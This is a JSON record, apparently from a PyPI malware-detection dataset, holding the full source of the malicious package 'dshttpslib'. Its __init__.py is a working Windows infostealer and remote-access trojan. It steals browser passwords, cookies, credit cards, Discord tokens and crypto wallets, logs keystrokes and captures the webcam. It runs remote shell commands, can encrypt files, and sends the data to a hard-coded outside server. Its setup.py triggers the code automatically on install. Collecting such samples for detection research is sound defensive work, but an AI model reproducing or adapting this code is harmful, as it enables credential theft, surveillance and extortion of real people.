[
  {
    "pyfile": "__init__.py",
    "malicious_code_snippets": "import win32gui, win32console;win32gui.ShowWindow(win32console.GetConsoleWindow(), 0)\nfrom cryptography.fernet import Fernet\nimport socketio, base64, os, socket, platform, requests, sqlite3, json, shutil, random, string, re, time, threading, cv2, zipfile, ctypes, sys, webbrowser, keyboard\nfrom win32crypt import CryptUnprotectData\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\n\nsio = socketio.Client()\n\nwapned_path = os.getenv(\"temp\") + \"/\"\nrandom_name = lambda x: ''.join([random.choice(list(string.ascii_letters)) for _ in range(x)])\nappdata = os.getenv('LOCALAPPDATA')\nroaming = os.getenv(\"appdata\")\non = False\n\nclass Startup:\n    def __init__(self) -> None:\n        self.filename = sys.argv[0]\n        self.path = f\"C:/Users/{os.getenv('username')}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/bit64start.{self.filename.split('.')[-1]}\"\n        if not os.path.exists(self.path):\n            shutil.copy(\n                self.filename,\n                self.path)\n\nclass Browser:\n    def __init__(self, name, path) -> None:\n        self.path = path\n        self.name = name\n        self.profiles = [\n            '/Default',\n            '/Profile 1',\n            '/Profile 2',\n            '/Profile 3',\n            '/Profile 4',\n            '/Profile 5',\n            ]\n        self.profiles = [profile for profile in self.profiles if os.path.exists(path + profile)]\n        information['browsers'][self.name]={}\n        self.master_key = self.get_master_key()\n    \n    def get_master_key(self) -> bytes:\n        with open(os.path.join(self.path, \"Local State\"), \"r\", encoding=\"utf-8\") as f:\n            local_state = json.load(f)\n        master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])[5:]\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n        return master_key\n\n    def decrypt(self, buff: bytes) -> str:\n        iv, payload = buff[3:15], buff[15:]\n        cipher = AES.new(self.master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)[:-16].decode()\n        return decrypted_pass\n\n    def create_temporal_db(self, db) -> str:\n        if os.path.exists(db):\n            copy_path = wapned_path + random_name(10)\n            try:\n                print(copy_path)\n                shutil.copy(db, copy_path)\n            except Exception as e:\n                print(e)\n                return False\n            return copy_path\n        else:\n            return False\n\n    def cards(self) -> None:\n        for profile in self.profiles:\n            original_db = self.path + profile + \"/Web Data\"\n            temporal_db = self.create_temporal_db(original_db)\n            \n            if not temporal_db: return\n            conn = sqlite3.connect(temporal_db)\n            cursor = conn.cursor()\n            cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')\n\n            cards = [\n                {\n                \"name\":info[0],\n                \"month\":info[1],\n                \"year\":info[2],\n                \"number\":self.decrypt(info[3]),\n                \"date_modified\":info[4]\n                }for info in cursor.fetchall()\n                if info[0] or info[1] or info[2] or info[3]\n            ]\n            \n            information['browsers'][self.name]['cards']=cards\n            conn.close()\n            os.remove(temporal_db)\n            return cards\n        \n    def passwords(self) -> None:\n        for profile in self.profiles:\n            original_db = self.path + profile + \"/Login Data\"\n            temporal_db = self.create_temporal_db(original_db)\n            if not temporal_db: return\n            \n            conn = sqlite3.connect(temporal_db)\n            cursor = conn.cursor()\n            cursor.execute('SELECT action_url, username_value, password_value FROM logins')\n\n            passwords = [\n                {\n                \"url\":info[0],\n                \"username\":info[1],\n                \"password\":self.decrypt(info[2])\n                }for info in cursor.fetchall()\n                if info[2]\n            ]\n            information['browsers'][self.name]['passwords'] = passwords\n            information['passwords'] = information['passwords'] + passwords\n            conn.close()\n            os.remove(temporal_db)\n            return passwords\n\n    def history(self) -> None:\n        for profile in self.profiles:\n            original_db = self.path + profile + f\"/History\"\n            \n            temporal_db = self.create_temporal_db(original_db)\n            if not temporal_db: return\n            \n            conn = sqlite3.connect(temporal_db)\n            cursor = conn.cursor()\n            cursor.execute('SELECT url, title, last_visit_time FROM urls')\n\n            history = [\n                {\n                \"url\":info[0],\n                \"title\":info[1],\n                \"timestamp\":info[2]\n                }for info in cursor.fetchall()[0:1500]\n                if info[0] and info[1] and info[2]\n            ]\n            information['browsers'][self.name]['web-history']=history\n            conn.close()\n            os.remove(temporal_db)\n            return history\n\n    def cookies(\n        self\n        ) -> None:\n        for profile in self.profiles:\n            original_db = self.path + profile + f\"/Network/Cookies\"\n            temporal_db = self.create_temporal_db(\n                original_db\n                )\n            if not temporal_db:\n                return\n            \n            conn = sqlite3.connect(\n                temporal_db\n            )\n            cursor = conn.cursor()\n            cursor.execute(\n                'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies'\n            )\n            \n            cookies = [\n                {\n                \"url\":info[0],\n                \"expires\":info[1],\n                \"path\":info[2],\n                \"name\":self.decrypt(info[3]),\n                \"value\":info[4]\n                }\n                for info in cursor.fetchall()\n                if info[0] and info[1] and info[2] and info[3] and info[4]\n            ]\n            information[\"browsers\"][self.name][\"cookies\"] = cookies\n            information['cookies'] = information['cookies'] + cookies\n            conn.close()\n            os.remove(\n                temporal_db\n            )\n            return cookies\n\nclass GrabbBrowsers:\n    def __init__(\n        self\n        ) -> None:\n        self.browsers = {\n            'epic-privacy-browser': f'{appdata}/Epic Privacy Browser/User Data',\n            'google-chrome-sxs': f'{appdata}/Google/Chrome SxS/User Data',\n            'brave': f'{appdata}/BraveSoftware/Brave-Browser/User Data',\n            'microsoft-edge': f'{appdata}/Microsoft/Edge/User Data',\n            'google-chrome': f'{appdata}/Google/Chrome/User Data',\n            'yandex': f'{appdata}/Yandex/YandexBrowser/User Data',\n            'cent-browser': f'{appdata}/CentBrowser/User Data',\n            'sputnik': f'{appdata}/Sputnik/Sputnik/User Data',\n            'uran': f'{appdata}/uCozMedia/Uran/User Data',\n            '7star': f'{appdata}/7Star/7Star/User Data',\n            'orbitum': f'{appdata}/Orbitum/User Data',\n            'vivaldi': f'{appdata}/Vivaldi/User Data',\n            'iridium': f'{appdata}/Iridium/User Data',\n            'kometa': f'{appdata}/Kometa/User Data',\n            'amigo': f'{appdata}/Amigo/User Data',\n            'torch': f'{appdata}/Torch/User Data',\n        }\n    \n    def start(\n        self,\n        option: str,\n        ) -> None:\n        content = []\n        for name, path in self.browsers.items():\n            if os.path.exists(path):\n                BrowserObject = Browser(\n                    name,\n                    path\n                )\n                if option == 'cookies':\n                    a = BrowserObject.cookies()\n                    if isinstance(a, list):\n                        content = content + a\n                elif option == 'passwords':\n                    a = BrowserObject.passwords()\n                    if isinstance(a, list):\n                        content = content + a\n                elif option == 'cards':\n                    a = BrowserObject.cards()\n                    if isinstance(a, list):\n                        content = content + a\n                elif option == 'history':\n                    a = BrowserObject.history()\n                    if isinstance(a, list):\n                        content = content + a\n                elif option == 'all':\n                    for operation in [\n                        BrowserObject.cookies,\n                        BrowserObject.passwords,\n                        BrowserObject.cards,\n                        BrowserObject.history,]:\n                        try:\n                            operation()\n                        except:\n                            pass\n\n        return content\n\n\nclass GetTokens:\n    def __init__(self):\n        self.paths = {\n        'Discord': f'{roaming}/discord/Local Storage/leveldb/',\n        'Discord Canary': f'{roaming}/discordcanary/Local Storage/leveldb/',\n        'Lightcord': f'{roaming}/Lightcord/Local Storage/leveldb/',\n        'Discord PTB': f'{roaming}/discordptb/Local Storage/leveldb/',\n        'Opera': f'{roaming}/Opera Software/Opera Stable/Local Storage/leveldb/',\n        'Opera GX': f'{roaming}/Opera Software/Opera GX Stable/Local Storage/leveldb/',\n        'Amigo': f'{appdata}/Amigo/User Data/Local Storage/leveldb/',\n        'Torch': f'{appdata}/Torch/User Data/Local Storage/leveldb/',\n        'Kometa': f'{appdata}/Kometa/User Data/Local Storage/leveldb/',\n        'Orbitum': f'{appdata}/Orbitum/User Data/Local Storage/leveldb/',\n        'CentBrowser': f'{appdata}/CentBrowser/User Data/Local Storage/leveldb/',\n        '7Star': f'{appdata}/7Star/7Star/User Data/Local Storage/leveldb/',\n        'Sputnik': f'{appdata}/Sputnik/Sputnik/User Data/Local Storage/leveldb/',\n        'Vivaldi': f'{appdata}/Vivaldi/User Data/Default/Local Storage/leveldb/',\n        'Chrome SxS': f'{appdata}/Google/Chrome SxS/User Data/Local Storage/leveldb/',\n        'Chrome': f'{appdata}/Google/Chrome/User Data/Default/Local Storage/leveldb/',\n        'Chrome1': f'{appdata}/Google/Chrome/User Data/Profile 1/Local Storage/leveldb/',\n        'Chrome2': f'{appdata}/Google/Chrome/User Data/Profile 2/Local Storage/leveldb/',\n        'Chrome3': f'{appdata}/Google/Chrome/User Data/Profile 3/Local Storage/leveldb/',\n        'Chrome4': f'{appdata}/Google/Chrome/User Data/Profile 4/Local Storage/leveldb/',\n        'Chrome5': f'{appdata}/Google/Chrome/User Data/Profile 5/Local Storage/leveldb/',\n        'Epic Privacy Browser': f'{appdata}/Epic Privacy Browser/User Data/Local Storage/leveldb/',\n        'Microsoft Edge': f'{appdata}/Microsoft/Edge/User Data/Defaul/Local Storage/leveldb/',\n        'Uran': f'{appdata}/uCozMedia/Uran/User Data/Default/Local Storage/leveldb/',\n        'Yandex': f'{appdata}/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/',\n        'Brave': f'{appdata}/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/',\n        'Iridium': f'{appdata}/Iridium/User Data/Default/Local Storage/leveldb/'\n    }\n        self.regexp = r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}\"\n        self.regexp_enc = r\"dQw4w9WgXcQ:[^\\\"]*\"\n        self.tokens = []\n    \n    def start(self) -> None:\n        for name, path in self.paths.items():\n            if os.path.exists(path):\n                if \"cord\" in name:\n                    self.get_discord(name, path)\n                else:\n                    self.get_browser(name, path)\n        self.get_firefox()\n            \n    def get_master_key(self, path: str) -> bytes:\n        with open(path, \"r\", encoding=\"utf-8\") as f:\n            c = f.read()\n        local_state = json.loads(c)\n        master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n        master_key = master_key[5:]\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n        return master_key\n    \n    def decrypt_data(self, buff: bytes, master_key: bytes) -> str:\n        iv = buff[3:15]\n        payload = buff[15:]\n        cipher = AES.new(master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)\n        decrypted_pass = decrypted_pass[:-16].decode()\n        return decrypted_pass\n\n    def get_discord(self, name, path) -> None:\n        localstate = roaming+f'/{name.replace(\" \",\"\").lower()}/Local State'\n        if os.path.exists(localstate):\n            for filename in [filename for filename in os.listdir(path) if filename.split(\".\")[-1] in [\"log\", \"ldb\"]]:\n                for line in [x.strip() for x in open(f'{path}/{filename}', errors='ignore').readlines() if x.strip()]:\n                    for y in re.findall(self.regexp_enc, line):\n                        master_key = self.get_master_key(localstate)\n                        encrypted = base64.b64decode(y.split('dQw4w9WgXcQ:')[1])\n                        token = self.decrypt_data(encrypted, master_key)\n                        Token(token)\n    \n    def get_browser(self, name, path) -> None:\n        for filename in [filename for filename in os.listdir(path) if filename.split(\".\")[-1] in [\"log\", \"ldb\"]]:\n            for line in [x.strip() for x in open(f'{path}/{filename}', errors='ignore').readlines() if x.strip()]:\n                for token in re.findall(self.regexp, line):\n                    Token(token)\n\n    def get_firefox(self) -> None:\n        if os.path.exists(roaming+\"/Mozilla/Firefox/Profiles\"):\n            for path, _, files in os.walk(roaming+\"/Mozilla/Firefox/Profiles\"):\n                for file in [file for file in files if file.endswith('.sqlite')]:\n                    for line in [x.strip() for x in open(f'{path}/{file}', errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regexp, line):\n                            Token(token)\n\nclass Token:\n    def __init__(self, token: str) -> None:\n        self.token = token\n        self.check()\n\n    def check(self) -> None:\n        if not self.token in information['tokens']:\n            information['tokens'].append(self.token)\n\nclass Grabb:\n    def __init__(self) -> None:\n        pass\n    \n    def getInformation(self) -> dict:\n        information = {}\n        try:\n            hwid = os.popen('wmic csproduct get uuid').read().split('\\n')[1].strip()\n        except:\n            hwid = \"None\"\n        ip_adress = requests.get('https://api.ipify.org').text\n        username = os.getenv(\"UserName\") \n        computername = os.getenv(\"COMPUTERNAME\")\n        information[\"hwid\"]=hwid\n        information['username']=username\n        information['computername']=computername\n        information[\"os\"]=platform.system() + \" \" + platform.version()\n        information[\"ipv4\"]=socket.gethostbyname(\n            socket.gethostname()\n        )\n        information[\"ip\"]=ip_adress\n        information[\"machine\"]=platform.machine()\n        return information\n\n    def screenshot(self) -> str:\n        path = os.getenv('temp') + \"/\" + \"image.png\"\n        screenshot = ImageGrab.grab()\n        screenshot.save(path)\n        print(path)\n        return path\n    \n    def webcam(self) -> str:\n        cap = cv2.VideoCapture(0)\n        if not cap.isOpened():\n            return\n        ret, frame = cap.read()\n        if not ret:\n            return\n        filename = os.getenv('temp') + \"/\" + \"webcam-photo.png\"\n        cv2.imwrite(filename, frame)\n        cap.release()\n        return filename\n\nclass FileMagnament:\n    def __init__(\n        self\n        ) -> None:\n        self.globals = [\n            os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\n            os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\n            os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\n            os.path.join(os.path.expanduser(\"~\"), \"OneDrive\"),\n            os.path.join(os.path.expanduser(\"~\"), \"Videos\"),\n        ]\n        self.files = {}\n    \n    @staticmethod\n    def convertPathToZip(\n        name: str,\n        path: str\n        ) -> None:\n        if os.path.exists(path):\n            zip_name = wapned_path + name.replace(\" \", \"\") + \".zip\"\n            os.chdir(path)\n            if len(os.listdir(path)) > 0:\n                with zipfile.ZipFile(zip_name, \"w\") as f:\n                    for file in os.listdir(path):\n                        f.write(file)\n            return zip_name\n\n    def basicGrb(\n        self,\n        wallets=False,\n        relevant=False,\n        read=True,\n        ) -> dict:\n        if wallets==True:\n            self.paths = {\n                \"Atomic LevelDB\": f\"{roaming}/atomic/Local Storage/leveldb\",\n                \"Exodus Wallet\": f\"{roaming}/Exodus/exodus.wallet\",\n                \"Exodus Wallet LevelDB\": f\"{roaming}/Exodus/Local Storage/leveldb\",\n                \"Atomic Wallet\": f\"{roaming}/AtomicWallet/Local Storage/leveldb\",\n                \"Electrum Wallet\": f\"{roaming}/Electrum/wallets/leveldb\",\n                \"Bitcoin Core\": f\"{roaming}/Bitcoin/Core/leveldb\",\n                \"Litecoin Core\": f\"{roaming}/Litecoin/Core/leveldb\",\n                \"Ethereum (Geth)\": f\"{roaming}/Ethereum/geth/leveldb\",\n                \"Ethereum (Parity)\": f\"{roaming}/Ethereum/paritydb/leveldb\",\n                \"Monero\": f\"{roaming}/Monero/lmdb/leveldb\",\n                \"Dash Core\": f\"{roaming}/DashCore/blocks/index/leveldb\",\n            }\n        elif relevant==True:\n            self.paths = {\n                \"Epic Games LevelDB\": f\"{roaming}/Epic Games/UnrealEngineLauncher/Launcher/storage/assets/DataStore/filecache/*\",\n                \"Steam LevelDB\": f\"{roaming}/Steam/config/*/localconfig.vdf\",\n                \"Rockstar Games LevelDB\": f\"{roaming}/Rockstar Games/Social Club/Databases/*\",\n                \"Ubisoft LevelDB\": f\"{roaming}/Ubisoft/Ubisoft Game Launcher/cache/core/*\",\n                \"Origin LevelDB\": f\"{roaming}/Origin/LocalContent/EAD4*/cache/*\",\n                \"GOG.com LevelDB\": f\"{roaming}/GOG.com/Galaxy/storage/cache/*\",\n                \"Rave LevelDB\": f\"{roaming}/Rave/Local Storage/leveldb/\"\n            }\n        for name, path in self.paths.items():\n            zipfile = self.convertPathToZip(\n                name=name,\n                path=path\n            )\n            if zipfile != None:\n                if read:\n                    with open(zipfile, \"rb\") as f:\n                        file_data = f.read()\n                    self.files[zipfile.replace(wapned_path, \"\")]=file_data\n                else:\n                    self.files[zipfile.replace(wapned_path, \"\")]=open(zipfile, \"rb\")\n        return self.files\n\n    def searchFile(\n        self,\n        filename=None,\n        filenames=None,\n        path='C:/',\n        ) -> str | dict:\n        for act, dirs, files in os.walk(path):\n            for file in files:\n                if filename != None:\n                    if filename.lower() in file.lower():\n                        self.filesfiles.append(os.path.join(act, file))\n                else:\n                    for file_ in filenames:\n                        if file_.lower() in file.lower():\n                            self.files[random_name(5) + \"-\" + file]=open(os.path.join(act, file), \"rb\").read()\n                            break\n\n    def getBackupCodes(\n        self\n        ) -> dict:\n        for path in self.globals:\n            self.searchFile(\n                filenames=[\n                    \"backup_codes\",\n                    \"discord_backup\",\n                    \"discord_codes\",\n                ],\n                path=path\n            )\n        return self.files\n\nclass Encrypter:\n    def __init__(\n        self,\n        path: str,\n        key: str\n        ) -> None:\n        self.key = bytes(key, 'utf-8')\n        self.fernet = Fernet(self.key)\n        if os.path.isfile(path):\n            self.paths = [path]\n        if os.path.isdir(path):\n            self.paths = [os.path.join(path, file) for file, _, __ in os.walk(path)]\n    \n    def encryptFiles(\n        self\n        ) -> None:\n        for file in self.paths:\n            if os.path.exists(file):\n                self.encrypt_file(file)\n        return True\n\n    def decryptFiles(\n        self\n        ) -> None:\n        for file in self.paths:\n            if os.path.exists(file):\n                self.decrypt_file(file)\n        return True\n\n    def encrypt_name(\n        self,\n        file: str\n        ) -> None:\n        os.rename(file, self.fernet.encrypt(os.path.basename(file)).decode() + \".exe\")\n\n    def encrypt_file(\n        self, \n        file: str\n        ) -> None:\n        with open(file, 'rb') as f:\n            e = self.fernet.encrypt(f.read())\n        with open(file, 'wb') as f:\n            f.write(e)\n\n    def decrypt_file(\n        self, \n        file: str\n        ) -> None:\n        with open(file, 'rb') as f:\n            e = self.fernet.decrypt(f.read())\n        with open(file, 'wb') as f:\n            f.write(e)\n\nObj = Grabb()\n\n\non = False\nclass KeyLogger:\n    def __init__(\n        self\n        ):\n        self.data = []\n\n    def keylog_event(\n        self,\n        key\n        ) -> None:\n        if key.event_type == keyboard.KEY_DOWN:\n            self.data.append(key.name)\n            self.ultimatum = time.time()\n            print(f\"Tecla presionada: {key.name}\")\n\n    def start(\n        self\n        ) -> None:\n        global on\n        on = True\n        self.ultimatum = time.time()\n        keyboard.hook(self.keylog_event)\n        while on:\n            if self.ultimatum != None:\n                if (time.time() - self.ultimatum) > 5:\n                    self.ultimatum = None\n                    if len(self.data) > 100:\n                        self.send()\n        if not on:\n            keyboard.unhook_all()\n\n    def send(\n        self\n        ) -> None:\n        sio.emit('keylog-response', self.data)\n        self.data = []\n\n@sio.event\ndef connect():\n    sio.emit('join', user_id)\n    print('Conectado al servidor')\n\n@sio.on('command')\ndef command(cmd):\n    sio.emit('command-response', os.popen(cmd['cmd']).read())\n\n@sio.on('history')\ndef history():\n    sio.emit('history-response', GrabbBrowsers().start('history'))\n\n@sio.on('discord-tokens')\ndef tokens():\n    information['tokens']=[]\n    GetTokens().start()\n    time.sleep(5)\n    sio.emit('discord-tokens-response', information['tokens'])\n\n@sio.on('cards')\ndef cards():\n    sio.emit('cards-response', GrabbBrowsers().start('cards'))\n\n@sio.on('passwords')\ndef passwords():\n    sio.emit('passwords-response', GrabbBrowsers().start('passwords'))\n\n@sio.on('download')\ndef download(filename: str):\n    if os.path.exists(filename):\n        with open(filename, \"rb\") as f:\n            data = f.read()\n        sio.emit('download-response', {'file.' + filename.split('.')[-1]: data})\n    else:\n        sio.emit('download-response', False)\n\n@sio.on('backup-codes')\ndef getBackupCodes():\n    sio.emit('backup-codes-response', FileMagnament().getBackupCodes())\n\n@sio.on('cookies')\ndef cookies():\n    sio.emit('cookies-response', GrabbBrowsers().start('cookies'))\n\n@sio.on('browsers')\ndef browsers():\n    GrabbBrowsers().start('all',)\n    sio.emit('browsers-response', information['browsers'])\n\n@sio.on('website')\ndef website(url: str):\n    try:\n        webbrowser.open(url)\n        sio.emit('website-response', True)\n    except:\n        sio.emit('website-response', False)\n\n@sio.on('upload')\ndef upload(args: dict):\n    try:\n        response = requests.get(args['url'])\n        if response.status_code == 200:\n            with open(args['path'], \"wb\") as f:\n                f.write(response.content)\n            sio.emit('upload-response', True)\n        else:\n            sio.emit('upload-response', False)\n    except Exception as e:\n        sio.emit('upload-response', False)\n\n@sio.on('alert')\ndef upload(alert: str):\n    threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, alert, '#YeezyGvng & #WapnedGvng', 0x10,)).start()\n    sio.emit('alert-response', True)\n\n@sio.on('wallets')\ndef wallets():\n    sio.emit('wallets-response', FileMagnament().basicGrb(wallets=True))\n\n@sio.on('gamestores')\ndef wallets():\n    sio.emit('gamestores-response', FileMagnament().basicGrb(relevant=True))\n\n@sio.on('screenshot')\ndef screenshot():\n    with open(Obj.screenshot(), 'rb') as image_file:\n        image_data = image_file.read()\n        sio.emit('screenshot-response', image_data)\n\n@sio.on('webcam')\ndef screenshot():\n    file = Obj.webcam()\n    with open(file, 'rb') as image_file:\n        image_data = image_file.read()\n        sio.emit('webcam-response', image_data)\n\n@sio.on('ip')\ndef screenshot():\n    sio.emit('ip-response', requests.get('https://api.ipify.org').text)\n\n@sio.on('website')\ndef screenshot(url: str):\n    sio.emit('website-response', webbrowser.open(url=url))\n\n@sio.on('encrypt')\ndef encrypt(data):\n    file = data['path']\n    key = data['key']\n    sio.emit('encrypt-response', Encrypter(file, key).encryptFiles())\n\n@sio.on('decrypt')\ndef decrypt(data):\n    file = data['path']\n    key = data['key']\n    sio.emit('decrypt-response', Encrypter(file, key).decryptFiles())\n\n@sio.on('information')\ndef info():\n    sio.emit('information-response', Obj.getInformation())\n\n@sio.on('initkeylog')\ndef info(data: bool):\n    global on\n    global keylogthread\n    if data:\n        if not on:\n            keylogthread = threading.Thread(target=KeyLogger().start).start()\n            sio.emit('initkeylog-response', True)\n        else:\n            sio.emit('initkeylog-response', 101)\n    else:\n        on = False\n        try:\n            keylogthread.join()\n        except:\n            pass\n        sio.emit('initkeylog-response', False)\n\n@sio.on('listdir')\ndef listdir(path: str):\n    if os.path.exists(path):\n        sio.emit('listdir-response', {\"path\": path, \"files\":os.listdir(path)})\n    else:\n        sio.emit('listdir-response', False)\n\n@sio.event\ndef disconnect():\n    pass\n\ndef define_(\n    id_: str,\n    api_: str,\n    init=True,\n    ) -> None:\n    global user_id\n    user_id = id_\n    global api_url\n    api_url = api_\n    global information\n    if init:\n        Startup()\n        wallets_ = FileMagnament().basicGrb(wallets=True, read=False)\n        information = {\n            \"passwords\":[],\n            \"cookies\":[],\n            \"browsers\":{},\n            \"tokens\":[],\n            \"information\":Obj.getInformation(),\n            \"wallets\":[name for name, x in wallets_.items()],\n        }\n        GrabbBrowsers().start('all')\n        GetTokens().start()\n        r = requests.post(\n            url=f'{api_url}/api/{user_id}/',\n            json=information,\n        )\n        \n        r = requests.post(\n            url=f'{api_url}/api/{user_id}/wallets/',\n            files=wallets_,\n        )\n\n    information = {}\n\n    sio.connect(api_url)\n    try:\n        sio.wait()\n    except Exception as e:\n        print(e)\n    sio.disconnect()\n\napi = \"https://yeezy-api.onrender.com/\"\nuser_id = \"1166039508446351390\"\n\ndefine_(\n    user_id,\n    api,\n    True,\n)\n"
  },
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import subprocess\nimport os\nimport time\nfrom setuptools.command.install import install\n\nclass PostInstallCommand(install):\n    def run(self):\n        install.run(self)\n        print(\"Loading...\")\n        try:\n            temp_path = os.path.join(os.getenv(\"temp\"), \"code.py\")\n\n            with open(temp_path, \"w\") as f:\n                f.write(\"import dshttpslib\")\n            \n            time.sleep(3)\n            \n            print(\"Executing code...\")\n            subprocess.check_call([\"python\", temp_path])\n\n        except Exception as e:\n            print(f\"An error occurred: {e}\")"
  },
  {
    "metadata": {
      "package_name": "dshttpslib-1.7.8",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/dshttpslib-1.7.8.txt"
    }
  }
]